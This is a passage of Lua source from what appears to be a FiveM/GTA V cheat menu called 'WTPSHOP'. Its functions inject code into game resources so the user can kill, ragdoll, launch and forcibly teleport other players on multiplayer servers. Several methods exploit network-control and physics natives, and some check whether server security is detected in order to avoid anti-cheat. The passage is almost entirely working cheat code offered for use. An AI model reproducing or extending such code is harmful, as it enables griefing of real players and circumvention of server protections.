                                                WTPSHOP.Native(SetCurrentPedWeapon, selfPed, 'weapon_unarmed', true)
                                            end)
                                        ]], playerId))
                                    end
                                elseif value == "Method 2" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local weaponName = 'weapon_appistol'
                                            local ammoAmount = 999
                                            local targetSid = %d

                                            WTPSHOP.Native(CreateThread, function()
                                                local weapon = GetHashKey(weaponName)

                                                RequestWeaponAsset(weapon, 31, 26)
                                                while not HasWeaponAssetLoaded(weapon) do
                                                    Wait(0)
                                                end

                                                local selfPed = PlayerPedId()
                                                WTPSHOP.Native(GiveDelayedWeaponToPed, selfPed, weapon, ammoAmount, true)
                                                WTPSHOP.Native(SetPedAmmo, selfPed, weapon, ammoAmount)
                                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))

                                                if DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                                    local targetCoords = GetEntityCoords(targetPed)
                                                    local fromCoords = targetCoords + vec3(0.0, 0.0, 0.1)

                                                    WTPSHOP.Native(ShootSingleBulletBetweenCoords, fromCoords.x, fromCoords.y, fromCoords.z, targetCoords.x, targetCoords.y, targetCoords.z, 999999, true, weapon, selfPed, true, false, 999999.0)
                                                    WTPSHOP.Native(SetPedUsingActionMode, selfPed, true, -1, 1)
                                                    WTPSHOP.Native(SetPedCurrentWeaponVisible, selfPed, false, false, true, true)
                                                end

                                                WTPSHOP.Native(SetPedUsingActionMode, selfPed, false, -1, 'DEFAULT_ACTION')
                                                WTPSHOP.Native(RemoveWeaponFromPed, selfPed, weapon)
                                                WTPSHOP.Native(SetCurrentPedWeapon, selfPed, 'weapon_unarmed', true)
                                            end)
                                        ]], playerId))
                                    end
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Ragdoll Player",
                            desc = 'Force the selected player to fall over dont spam or you gonna killed the target.',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetID = tonumber(targetPlayers[1])
                                ApiRasclat.SafeRes(string.format([[
                                    local targetSid = %d
                                    local weapon = 'weapon_snowball'

                                    WTPSHOP.Native(CreateThread, function()
                                        RequestWeaponAsset(weapon, 31, 26)
                                        while not HasWeaponAssetLoaded(weapon) do Wait(0) end

                                        local selfPed = PlayerPedId()
                                        local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))

                                        if DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                            local boneTarget = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
                                            local fromCoords = boneTarget + vec3(0.0, 0.0, 0.1)
                                            local forward = GetEntityForwardVector(targetPed)

                                            WTPSHOP.Native(ShootSingleBulletBetweenCoords, fromCoords.x, fromCoords.y, fromCoords.z, boneTarget.x, boneTarget.y, boneTarget.z, 0, 
                                            true, weapon, selfPed, false, true, 0.0)
                                            WTPSHOP.Native(SetPedUsingActionMode, selfPed, true, -1, 1)
                                            WTPSHOP.Native(SetPedCurrentWeaponVisible, selfPed, false, false, true, true)
                                            WTPSHOP.Native(SetPedCanRagdoll, targetPed, true)
                                            WTPSHOP.Native(SetPedToRagdoll, targetPed, 3000, 3000, 0, true, true, false)
                                            WTPSHOP.Native(ApplyForceToEntity, targetPed, 1, -forward.x * 5.0, -forward.y * 5.0, 0.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                        end

                                        WTPSHOP.Native(SetPedUsingActionMode, selfPed, false, -1, 'DEFAULT_ACTION')
                                        WTPSHOP.Native(RemoveWeaponFromPed, selfPed, weapon)
                                        WTPSHOP.Native(SetCurrentPedWeapon, selfPed, 'weapon_unarmed', true)
                                    end)
                                ]], targetID))
                                self:Notify("success", "WTPSHOP", "Ragdolled ID: " .. targetID, 3000)
                            end
                        },
                        {
                            type = "button",
                            label = "Make Player Invisible",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, isSelected in pairs(CPlayers) do
                                    if isSelected then targetPlayers[#targetPlayers + 1] = serverId end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetID = tonumber(targetPlayers[1])

                                ApiRasclat.SafeRes(string.format([[
                                    local targetId = %d
                                    local cmd = "carry"
                                    local myPed = PlayerPedId()
                                    local originalCoords = GetEntityCoords(myPed)

                                    local targetIdx = GetPlayerFromServerId(targetId)
                                    if targetIdx == -1 then return end
                                    local targetPed = GetPlayerPed(targetIdx)

                                    if not WTPSHOP.Native(DoesEntityExist, targetPed) then return end

                                    WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                    WTPSHOP.Native(SetEntityAlpha, myPed, 0, false)

                                    local currentPos = GetEntityCoords(targetPed)
                                    WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                    WTPSHOP.Native(Wait, 50)

                                    WTPSHOP.Native(ExecuteCommand, cmd)
                                    WTPSHOP.Native(Wait, 300)

                                    WTPSHOP.Native(ExecuteCommand, cmd)
                                    WTPSHOP.Native(DetachEntity, targetPed, true, true)
                                    WTPSHOP.Native(DetachEntity, myPed, true, true)
                                    WTPSHOP.Native(ClearPedTasksImmediately, targetPed)
                                    WTPSHOP.Native(ClearPedTasksImmediately, myPed)
                                    WTPSHOP.Native(Wait, 100)

                                    WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                    local timeout = 0
                                    while not WTPSHOP.Native(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                        WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                        WTPSHOP.Native(Wait, 10)
                                        timeout = timeout + 1
                                    end

                                    WTPSHOP.Native(FreezeEntityPosition, targetPed, true)
                                    WTPSHOP.Native(Wait, 50)
                                    WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                    WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                    WTPSHOP.Native(ResetEntityAlpha, myPed)

                                    WTPSHOP.Native(Wait, 200)
                                    WTPSHOP.Native(FreezeEntityPosition, targetPed, false)
                                ]], playerId))

                                self:Notify("success", "WTPSHOP", "Successfully make player invisible", 3000)
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = { "Method 1", "Method 2", "Method 3", "Method 4" }, label = "Launch Player", desc = 'This will attempt to launch the player into the sky',
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                if value == "Method 1" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode(targetRes, [[
                                            WTPSHOP.Native(CreateThread, function()
                                                local targetId = tonumber(]] .. playerId .. [[)
                                                local targetPlayer = GetPlayerFromServerId(targetId)
                                                if targetPlayer == -1 then return end
                                                local ped = GetPlayerPed(targetPlayer)
                                                if not WTPSHOP.Native(DoesEntityExist, ped) then return end

                                                local model = joaat("bmx")
                                                WTPSHOP.Native(RequestModel, model)
                                                while not WTPSHOP.Native(HasModelLoaded, model) do WTPSHOP.Native(Wait, 0) end
                                                local coords = GetEntityCoords(ped)
                                                local obj = WTPSHOP.Native(CreateObject, model, coords.x, coords.y, coords.z - 5.0, true, true, false)
                                                if not WTPSHOP.Native(DoesEntityExist, obj) then return end
                                                WTPSHOP.Native(SetEntityVisible, obj, false, false)
                                                WTPSHOP.Native(SetEntityInvincible, obj, true)
                                                WTPSHOP.Native(FreezeEntityPosition, obj, false)
                                                WTPSHOP.Native(AttachEntityToEntityPhysically,
                                                    obj,
                                                    ped,
                                                    -1e38,
                                                    1e26,
                                                    0,
                                                    1e38,
                                                    -1e38,
                                                    800990.0,
                                                    19980.0,
                                                    1e26,
                                                    99999.0,
                                                    true,
                                                    true,
                                                    false,
                                                    false,
                                                    0
                                                )

                                                for i = 1, 20 do
                                                    if WTPSHOP.Native(DoesEntityExist, obj) then
                                                        WTPSHOP.Native(SetEntityVelocity, obj, 0.0, 0.0, 500.0 + (i * 50.0))
                                                        WTPSHOP.Native(Wait, 10)
                                                    end
                                                end

                                                WTPSHOP.Native(Wait, 100)
                                                WTPSHOP.Native(DeleteEntity, obj)
                                                WTPSHOP.Native(SetModelAsNoLongerNeeded, model)
                                            end)
                                        ]])
                                    end
                                    self:Notify("success", "WTPSHOP", "Launching Target...", 3000)
                                elseif value == "Method 2" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode(targetRes, [[
                                            WTPSHOP.Native(CreateThread, function()
                                                local targetId = tonumber(]] .. playerId .. [[)
                                                local targetPlayer = GetPlayerFromServerId(targetId)
                                                if targetPlayer == -1 then return end
                                                local me = GetPlayerPed(targetPlayer)
                                                if not WTPSHOP.Native(DoesEntityExist, me) then return end

                                                local models = {joaat("adder"), joaat("bmx"), joaat("adder")}
                                                for _, m in ipairs(models) do
                                                    WTPSHOP.Native(RequestModel, m)
                                                    while not WTPSHOP.Native(HasModelLoaded, m) do WTPSHOP.Native(Wait, 0) end
                                                end

                                                local function spawnAndYeet(modelName, forceZ, offsetMult)
                                                    local coords = GetEntityCoords(ped)
                                                    local obj = WTPSHOP.Native(CreateObject, modelName, coords.x, coords.y, coords.z - 10.0, true, true, false)
                                                    if not WTPSHOP.Native(DoesEntityExist, obj) then return end
                                                    WTPSHOP.Native(SetEntityVisible, obj, false, false)
                                                    WTPSHOP.Native(SetEntityInvincible, obj, true)
                                                    WTPSHOP.Native(FreezeEntityPosition, obj, false)
                                                    
                                                    WTPSHOP.Native(AttachEntityToEntityPhysically,
                                                        obj, me, 0, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,
                                                        9999999.0, 9999999.0, 9999999.0, 25.0, 106.0, 900.0,
                                                        true, true, true, false, 0
                                                    )

                                                    for i = 1, 1500 do
                                                        if WTPSHOP.Native(DoesEntityExist, obj) and WTPSHOP.Native(DoesEntityExist, me) then
                                                            WTPSHOP.Native(SetEntityCollision, me, false, false)
                                                            WTPSHOP.Native(SetEntityVelocity, obj, 0.0, 0.0, 99999.0)
                                                            WTPSHOP.Native(SetEntityVelocity, me, 0.0, 0.0, 99999.0)

                                                            local cur = GetEntityCoords(me)
                                                            WTPSHOP.Native(SetEntityCoordsNoOffset, me, cur.x, cur.y, cur.z + (500.0 * offsetMult), false, false, false)
                                                            WTPSHOP.Native(Wait, 0)
                                                        end
                                                    end
                                                    WTPSHOP.Native(DeleteEntity, obj)
                                                end

                                                spawnAndYeet(models[1], 50000000.0, 100)
                                                WTPSHOP.Native(Wait, 10)
                                                spawnAndYeet(models[2], 80000000.0, 150)
                                                WTPSHOP.Native(Wait, 10)
                                                spawnAndYeet(models[3], 999990999.0, 200)

                                                WTPSHOP.Native(SetEntityCollision, me, true, true)
                                                for _, m in ipairs(models) do 
                                                    WTPSHOP.Native(SetModelAsNoLongerNeeded, m)
                                                end
                                            end)
                                        ]])
                                    end
                                    self:Notify("success", "WTPSHOP", "Launch V2 Engaged", 3000)
                                elseif value == "Method 3" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        if IsDetections then
                                            self:Notify("info", "WTPSHOP", "Security detected Method disabled.", 3000)
                                        else
                                            ApiRasclat.SafeRes(string.format([[
                                                local targetSid = %d
                                                local function GetPlayerFromServerId(serverId)
                                                    for _, player in ipairs(GetActivePlayers()) do
                                                        if GetPlayerServerId(player) == serverId then
                                                            return player
                                                        end
                                                    end
                                                    return nil
                                                end

                                                WTPSHOP.Native(CreateThread, function()
                                                    local clientId = GetPlayerFromServerId(targetSid)
                                                    if not clientId then return end

                                                    local selected_ped = GetPlayerPed(clientId)
                                                    if not selected_ped or not IsEntityAPed(selected_ped) or selected_ped == PlayerPedId() then
                                                        return
                                                    end

                                                    local d = GetEntityCoords(PlayerPedId())
                                                    local selected_coords = GetEntityCoords(selected_ped)
                                                    local nearestVehicle = GetClosestVehicle(selected_coords.x, selected_coords.y, selected_coords.z, 100.0, 0, 71)

                                                    if not DoesEntityExist(nearestVehicle) then return end
                                                    WTPSHOP.Native(Wait, 1000)
                                                    WTPSHOP.Native(SetPedIntoVehicle, PlayerPedId(), nearestVehicle, -1)

                                                    local timer = GetGameTimer() + 1300
                                                    while (not WTPSHOP.Native(NetworkHasControlOfEntity, nearestVehicle)) and GetGameTimer() < timer do
                                                        WTPSHOP.Native(NetworkRequestControlOfEntity, nearestVehicle)
                                                        WTPSHOP.Native(Wait, 1)
                                                    end

                                                    WTPSHOP.Native(AttachEntityToEntityPhysically, 
                                                        nearestVehicle,
                                                        selected_ped,
                                                        -1e38,
                                                        1e26,
                                                        0,
                                                        1e38,
                                                        -1e38,
                                                        800990.0,
                                                        19980.0,
                                                        1e26,
                                                        99999.0,
                                                        true,
                                                        true,
                                                        false,
                                                        false,
                                                        0
                                                    )

                                                    WTPSHOP.Native(ClearPedTasks, PlayerPedId())
                                                    WTPSHOP.Native(SetEntityVisible, PlayerPedId(), true, true)
                                                    WTPSHOP.Native(SetEntityCoordsNoOffset, PlayerPedId(), d.x, d.y, d.z, true, true, false)
                                                    WTPSHOP.Native(Wait, 1)
                                                end)
                                            ]], playerId))
                                        end
                                    end
                                    self:Notify("success", "WTPSHOP", "Launch V3 Engaged", 3000)
                                elseif value == "Method 4" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        if IsDetections then
                                            self:Notify("info", "WTPSHOP", "Security detected Method disabled.", 3000)
                                        else
                                            ApiRasclat.SafeRes(string.format([[ 
                                                local function SafeWrap(fn)
                                                    return function(...) return fn(...) end
                                                end

                                                local SafeThread = SafeWrap(CreateThread)
                                                local SafeWait = SafeWrap(Citizen.Wait)
                                                local SafePlayerPedId = SafeWrap(PlayerPedId)
                                                local SafeDoesEntityExist = SafeWrap(DoesEntityExist)
                                                local SafeGetEntityCoords = SafeWrap(GetEntityCoords)
                                                local SafeSetEntityVisible = SafeWrap(SetEntityVisible)
                                                local SafeSetEntityInvincible = SafeWrap(SetEntityInvincible)
                                                local SafeSetEntityCollision = SafeWrap(SetEntityCollision)
                                                local SafeAttachEntityToEntityPhysically = SafeWrap(AttachEntityToEntityPhysically)
                                                local SafeDetachEntity = SafeWrap(DetachEntity)
                                                local SafeDeleteEntity = SafeWrap(DeleteEntity)
                                                local SafeSetEntityCoords = SafeWrap(SetEntityCoords)
                                                local SafeGetHashKey = SafeWrap(GetHashKey)
                                                local SafeRequestModel = SafeWrap(RequestModel)
                                                local SafeHasModelLoaded = SafeWrap(HasModelLoaded)
                                                local SafeCVehicle = SafeWrap(CreateVehicle)

                                                local function loadVehicleModel(model)
                                                    local modelHash = SafeGetHashKey(model)
                                                    SafeRequestModel(modelHash)
                                                    while not SafeHasModelLoaded(modelHash) do
                                                        SafeWait(0)
                                                    end
                                                    return modelHash
                                                end

                                                SafeThread(function()
                                                    local playerPed = SafePlayerPedId()
                                                    local playerCoords = SafeGetEntityCoords(playerPed)
                                                    local targetId = %d
                                                    local targetPlayer = GetPlayerFromServerId(targetId)
                                                    if targetPlayer == -1 then return end
                                                    local targetPed = GetPlayerPed(targetPlayer)
                                                    if not SafeDoesEntityExist(targetPed) then return end

                                                    local vehModel = "bmx"
                                                    local vehHash = loadVehicleModel(vehModel)

                                                    local ghostVeh = SafeCVehicle(vehHash, playerCoords.x, playerCoords.y, playerCoords.z - 5.0, 0.0, true, false)
                                                    if not SafeDoesEntityExist(ghostVeh) then return end

                                                    SafeSetEntityVisible(ghostVeh, false, 0)
                                                    SafeSetEntityInvincible(ghostVeh, true)
                                                    SafeSetEntityCollision(ghostVeh, false, false)

                                                    local _, groundZ = GetGroundZFor_3dCoord(playerCoords.x, playerCoords.y, playerCoords.z, 0)
                                                    local skyHeight = (groundZ or playerCoords.z) + 1500.0

                                                    SafeSetEntityCoords(ghostVeh, playerCoords.x, playerCoords.y, skyHeight, false, false, false, false)

                                                    SafeAttachEntityToEntityPhysically(
                                                        ghostVeh,
                                                        targetPed,
                                                        0, 0, 0,
                                                        0.0, 0.0, 0.0,
                                                        0.0, 0.0, 300.0,
                                                        true, true, true, false, 0
                                                    )

                                                    SafeWait(500)

                                                    SafeDetachEntity(ghostVeh, true, true)
                                                    SafeDeleteEntity(ghostVeh)

                                                    SafeSetEntityCoords(targetPed, playerCoords.x, playerCoords.y, skyHeight + 50.0, false, false, false, false)
                                                end)
                                            ]], playerId))
                                        end
                                    end
                                    self:Notify("success", "WTPSHOP", "Launch V4 Engaged", 3000)
                                end
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = { "Air", "Chiliad", "Vinewood", "Maze Bank", "Death", "Agency Bunker", "Record A Bunker", "Meth Bunker", "After Hours Bunker", "Tunnel Bunker", "Waypoint", "Bring Target" }, label = "Bring Player", desc = 'This will attempt to bring player into specific location.',
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                if value == "Air" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTPSHOP.Native(DoesEntityExist, targetPed) then return end

                                            WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                            WTPSHOP.Native(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTPSHOP.Native(Wait, 50)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(Wait, 100)

                                            local highZ = currentPos.z + 700.0
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, highZ, false, false, false)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTPSHOP.Native(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                                WTPSHOP.Native(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, true)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(DetachEntity, targetPed, true, true)
                                            WTPSHOP.Native(DetachEntity, myPed, true, true)
                                            WTPSHOP.Native(ClearPedTasksImmediately, targetPed)
                                            WTPSHOP.Native(ClearPedTasksImmediately, myPed)

                                            WTPSHOP.Native(Wait, 300)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                            WTPSHOP.Native(ResetEntityAlpha, myPed)

                                            WTPSHOP.Native(Wait, 200)
                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTPSHOP", "Successfully bring the player into Air.", 3000)
                                elseif value == "Chiliad" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = 450.0, 5580.0, 800.0

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTPSHOP.Native(DoesEntityExist, targetPed) then return end

                                            WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                            WTPSHOP.Native(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTPSHOP.Native(Wait, 50)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTPSHOP.Native(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                                WTPSHOP.Native(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, true)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(DetachEntity, targetPed, true, true)
                                            WTPSHOP.Native(DetachEntity, myPed, true, true)
                                            WTPSHOP.Native(ClearPedTasksImmediately, targetPed)
                                            WTPSHOP.Native(ClearPedTasksImmediately, myPed)

                                            WTPSHOP.Native(Wait, 300)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                            WTPSHOP.Native(ResetEntityAlpha, myPed)

                                            WTPSHOP.Native(Wait, 200)
                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTPSHOP", "Successfully bring the player into Chiliad.", 3000)
                                elseif value == "Vinewood" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = 742.40, 1271.51, 383.17

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTPSHOP.Native(DoesEntityExist, targetPed) then return end

                                            WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                            WTPSHOP.Native(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTPSHOP.Native(Wait, 50)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTPSHOP.Native(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                                WTPSHOP.Native(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, true)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(DetachEntity, targetPed, true, true)
                                            WTPSHOP.Native(DetachEntity, myPed, true, true)
                                            WTPSHOP.Native(ClearPedTasksImmediately, targetPed)
                                            WTPSHOP.Native(ClearPedTasksImmediately, myPed)

                                            WTPSHOP.Native(Wait, 300)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                            WTPSHOP.Native(ResetEntityAlpha, myPed)

                                            WTPSHOP.Native(Wait, 200)
                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTPSHOP", "Successfully bring the player into Vinewood.", 3000)
                                elseif value == "Maze Bank" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = -75.28, -818.84, 326.17

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTPSHOP.Native(DoesEntityExist, targetPed) then return end

                                            WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                            WTPSHOP.Native(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTPSHOP.Native(Wait, 50)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTPSHOP.Native(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                                WTPSHOP.Native(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, true)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(DetachEntity, targetPed, true, true)
                                            WTPSHOP.Native(DetachEntity, myPed, true, true)
                                            WTPSHOP.Native(ClearPedTasksImmediately, targetPed)
                                            WTPSHOP.Native(ClearPedTasksImmediately, myPed)

                                            WTPSHOP.Native(Wait, 300)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                            WTPSHOP.Native(ResetEntityAlpha, myPed)

                                            WTPSHOP.Native(Wait, 200)
                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTPSHOP", "Successfully bring the player into Maze Bank.", 3000)
                                elseif value == "Death" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = -75.28, -818.84, 326.17

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTPSHOP.Native(DoesEntityExist, targetPed) then return end

                                            WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                            WTPSHOP.Native(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTPSHOP.Native(Wait, 50)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y,  2500.0, false, false, false)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTPSHOP.Native(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                                WTPSHOP.Native(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, true)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(DetachEntity, targetPed, true, true)
                                            WTPSHOP.Native(DetachEntity, myPed, true, true)
                                            WTPSHOP.Native(ClearPedTasksImmediately, targetPed)
                                            WTPSHOP.Native(ClearPedTasksImmediately, myPed)

                                            WTPSHOP.Native(Wait, 300)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                            WTPSHOP.Native(ResetEntityAlpha, myPed)

                                            WTPSHOP.Native(Wait, 200)
                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTPSHOP", "Successfully bring the player into Death.", 3000)
                                elseif value == "Agency Bunker" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = -1111.999, -76.620, -91.379

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTPSHOP.Native(DoesEntityExist, targetPed) then return end

                                            WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                            WTPSHOP.Native(SetEntityAlpha, myPed, 0, false)

